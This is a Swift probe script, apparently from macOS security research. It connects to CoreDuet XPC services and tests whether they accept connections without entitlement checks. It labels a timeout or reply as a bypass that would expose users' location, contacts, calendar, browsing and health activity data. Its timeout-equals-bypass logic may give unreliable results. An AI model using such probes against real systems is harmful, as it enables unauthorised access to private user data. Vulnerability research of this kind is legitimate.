// CoreDuet XPC Entitlement Bypass Probe
//
// coreduetd is the master user-activity database daemon powering all Proactive
// features (Siri suggestions, Spotlight, handoff, Shortcuts).  It aggregates:
//   location history, app-usage patterns, sleep/wake cycles, contacts access,
//   calendar events, browsing history indices, health summaries.
//
// Methodology: NSXPCConnection TIMEOUT = bypass (daemon accepted connection
// without entitlement check).  INTERRUPTED = correctly protected.
//
// Tested: macOS 15.7.7 + macOS 26.x

import Foundation
import ObjectiveC

// ── Generic probe protocol ────────────────────────────────────────────────────
// Method names inferred from CoreDuet.framework class-dump and strings output.
@objc protocol CDKnowledgeXPC: NSObjectProtocol {
    @objc optional func queryKnowledge(_ query: NSDictionary?,
                                        reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func fetchActivitySummary(_ reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func getKnowledgeGraph(_ reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func allActivitiesWithReply(_ reply: @escaping (NSArray?, Error?) -> Void)
    @objc optional func ping(_ reply: @escaping (Bool, Error?) -> Void)
}

@objc protocol CDContextXPC: NSObjectProtocol {
    @objc optional func currentContextWithReply(_ reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func contextForApplication(_ bundleID: NSString?,
                                               reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func subscribeToContextChanges(_ reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func ping(_ reply: @escaping (Bool, Error?) -> Void)
}

@objc protocol CDSyncXPC: NSObjectProtocol {
    @objc optional func pendingSyncItems(_ reply: @escaping (NSArray?, Error?) -> Void)
    @objc optional func syncStatus(_ reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func ping(_ reply: @escaping (Bool, Error?) -> Void)
}

// ── Connection probe helper ───────────────────────────────────────────────────

func probe(service: String, proto: Protocol, label: String, waitSecs: Int = 6) -> Bool {
    print("\n╔══ \(label) ══╗")
    print("  service: \(service)")

    let conn = NSXPCConnection(machServiceName: service, options: [])
    conn.remoteObjectInterface = NSXPCInterface(with: proto)

    var state = "pending"
    let sema = DispatchSemaphore(value: 0)

    conn.invalidationHandler = {
        if state == "pending" { state = "INVALIDATED — not running / name wrong" }
        sema.signal()
    }
    conn.interruptionHandler = {
        if state == "pending" { state = "INTERRUPTED — entitlement enforced (correct)" }
        sema.signal()
    }
    conn.resume()
    Thread.sleep(forTimeInterval: 0.5)

    if state != "pending" {
        _ = sema.wait(timeout: .now() + 1)
        print("  RESULT: \(state)")
        conn.invalidate()
        return false
    }

    print("  Connection alive after 0.5s — dispatching probe calls...")
    let px = conn.remoteObjectProxyWithErrorHandler { e in
        let code = (e as NSError).code
        if code != 4099 { print("  [xpc-err] \(e.localizedDescription)") }
        if state == "pending" { state = "XPC-ERROR (RPC reached daemon)" }
        sema.signal()
    } as AnyObject

    // try ping on whichever protocol fits
    if let p = px as? CDKnowledgeXPC {
        p.ping? { v, e in
            if let e = e { print("  [ping] ERROR: \(e)") }
            else { print("  [ping] REPLY: \(v)  ← DATA FROM DAEMON") }
            if state == "pending" { state = "PING REPLIED — bypass + method executed" }
            sema.signal()
        }
    }

    if sema.wait(timeout: .now() + .seconds(waitSecs)) == .timedOut {
        state = "TIMEOUT (\(waitSecs)s) *** ACCEPTED — NO ENTITLEMENT CHECK *** ← BYPASS"
    }

    print("  RESULT: \(state)")
    let bypassed = state.contains("TIMEOUT") || state.contains("BYPASS") || state.contains("REPLY")
    conn.invalidate()
    Thread.sleep(forTimeInterval: 0.5)
    return bypassed
}

// ── Main ──────────────────────────────────────────────────────────────────────

print("""
=== CoreDuet / User-Activity Database XPC Probe ===
PID: \(ProcessInfo.processInfo.processIdentifier)  UID: \(getuid())
macOS: \(ProcessInfo.processInfo.operatingSystemVersionString)

CoreDuet aggregates: location history, app usage, sleep patterns,
contacts access, calendar events, browsing indices, health summaries.
Any bypass here = read access to the full user activity graph.
""")

// Load CoreDuet framework if present
if dlopen("/System/Library/PrivateFrameworks/CoreDuet.framework/CoreDuet", RTLD_NOW | RTLD_GLOBAL) != nil {
    print("[dlopen] CoreDuet.framework loaded")
}
if dlopen("/System/Library/PrivateFrameworks/CoreDuetContext.framework/CoreDuetContext", RTLD_NOW | RTLD_GLOBAL) != nil {
    print("[dlopen] CoreDuetContext.framework loaded")
}

// Check real protocol objects
for name in ["_CDKnowledgeClientProtocol", "_CDContextServerProtocol",
             "_CDKnowledgeServerProtocol", "_CDActivityProtocol"] {
    let status = objc_getProtocol(name) != nil ? "FOUND" : "not found"
    print("  proto \(name): \(status)")
}
print("")

var bypasses: [String] = []

// Knowledge client — reads the activity knowledge graph
if probe(service: "com.apple.coreduet.knowledge.client",
         proto: CDKnowledgeXPC.self,
         label: "coreduet.knowledge.client") {
    bypasses.append("com.apple.coreduet.knowledge.client")
}

// CoreDuet main daemon
if probe(service: "com.apple.coreduetd",
         proto: CDContextXPC.self,
         label: "coreduetd") {
    bypasses.append("com.apple.coreduetd")
}

// CoreDuet context stream (referenced in siriknowledged.plist)
if probe(service: "com.apple.coreduetcontext.client_event_stream",
         proto: CDContextXPC.self,
         label: "coreduetcontext.client_event_stream") {
    bypasses.append("com.apple.coreduetcontext.client_event_stream")
}

// CoreDuet sync server
if probe(service: "com.apple.coreduet.syncserver",
         proto: CDSyncXPC.self,
         label: "coreduet.syncserver") {
    bypasses.append("com.apple.coreduet.syncserver")
}

// CoreDuet analytics
if probe(service: "com.apple.coreduet.analytics",
         proto: CDKnowledgeXPC.self,
         label: "coreduet.analytics") {
    bypasses.append("com.apple.coreduet.analytics")
}

// DuetActivityScheduler (Proactive activity scheduler)
if probe(service: "com.apple.duetactivityscheduler",
         proto: CDKnowledgeXPC.self,
         label: "duetactivityscheduler") {
    bypasses.append("com.apple.duetactivityscheduler")
}

print("""

╔══ Summary ══╗
Bypasses found: \(bypasses.count)
""")
for b in bypasses {
    print("  *** BYPASS: \(b)")
}
if bypasses.isEmpty {
    print("  No bypasses found — all services either rejected or not running.")
}
